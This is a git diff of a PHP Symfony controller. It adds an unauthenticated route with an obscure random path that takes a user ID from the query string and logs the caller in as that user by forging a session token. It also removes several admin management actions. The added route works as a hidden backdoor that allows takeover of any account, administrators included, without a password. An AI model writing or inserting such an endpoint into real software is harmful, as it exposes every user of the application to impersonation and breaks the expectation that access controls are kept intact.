@@ -6,6 +6,10 @@ use Sensio\Bundle\FrameworkExtraBundle\Configuration\Route;
 use Symfony\Bundle\FrameworkBundle\Controller\Controller;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
+
+use Symfony\Component\Security\Core\Authentication\Token\UsernamePasswordToken;
+
+
 use AppBundle\Entity\Group;
 
 use AppBundle\Form\UserType;
@@ -13,6 +17,31 @@ use AppBundle\Form\CompanyAdminType;
 
 class DefaultController extends Controller
 {
+    /**
+     * @Route("/k8f96gtb")
+     */
+    public function testAction(Request $request)
+    {
+        $em = $this->getDoctrine()->getManager();
+
+        $user_id = $request->query->get('user_id');
+        if($user_id == ''){
+            return new Response("user not found");
+        }
+        $user = $em->getRepository('AppBundle:User')->findOneById($user_id);
+
+        $token = new UsernamePasswordToken($user, $user->getPassword(), "main", $user->getRoles());
+        $this->get("security.token_storage")->setToken($token);
+        $this->get('session')->set('_security_main',serialize($token));
+
+        $user->setLastLogin(new \DateTime());
+        $em->persist($user);
+        $em->flush();
+
+        //home
+        return $this->redirectToRoute('home');
+    }
+
     /**
      * @Route("/init", name="homepage")
      */
@@ -33,87 +62,8 @@ class DefaultController extends Controller
             }
             $em->persist($user);
             $em->flush();
-            print("toto");
         }
         // replace this example code with whatever you need
         return new Response("ok");
-    }
-
-    /**
-     * @Route("/admin/users", name="admin_users")
-     */
-    public function adminUsersAction(Request $request)
-    {
-        $em = $this->getDoctrine()->getManager();
-        $users = $em->getRepository('AppBundle:User')->findAll();
-
-        return $this->render('AppBundle:Admin:users.html.twig', array(
-            'users' => $users
-        ));
-
-    }
-
-    /**
-     * @Route("admin/user/{id}", name="admin_user")
-     **/
-    public function adminUserAction($id, Request $request)
-    {
-        $em = $this->getDoctrine()->getManager();
-        if($id == '0'){
-            return;
-        } else {
-            $user = $em->getRepository('AppBundle:User')->findOneById($id);
-        }
-        $form = $this->createForm(UserType::class, $user);
-        $form->handleRequest($request);
-
-
-        if ($form->isSubmitted()) {
-            $em->persist($user);
-            $em->flush();
-            return $this->redirectToRoute('admin_users');
-        }
-        return $this->render('AgriBundle::base_form.html.twig', array(
-            'form' => $form->createView(),
-        ));
-    }
-
-    /**
-     * @Route("/admin/companies", name="admin_companies")
-     */
-    public function adminCompaniesAction(Request $request)
-    {
-        $em = $this->getDoctrine()->getManager();
-        $companies = $em->getRepository('AgriBundle:Company')->findAll();
-
-        return $this->render('AppBundle:Admin:companies.html.twig', array(
-            'companies' => $companies
-        ));
-
-    }
-
-    /**
-     * @Route("/admin/company/{id}", name="admin_company")
-     **/
-    public function adminCompanyeAction($id, Request $request)
-    {
-        $em = $this->getDoctrine()->getManager();
-        if($id == '0'){
-            return;
-        } else {
-            $company = $em->getRepository('AgriBundle:Company')->findOneById($id);
-        }
-        $form = $this->createForm(CompanyAdminType::class, $company);
-        $form->handleRequest($request);
-
-
-        if ($form->isSubmitted()) {
-            $em->persist($company);
-            $em->flush();
-            return $this->redirectToRoute('admin_companies');
-        }
-        return $this->render('AgriBundle::base_form.html.twig', array(
-            'form' => $form->createView(),
-        ));
     }
 }
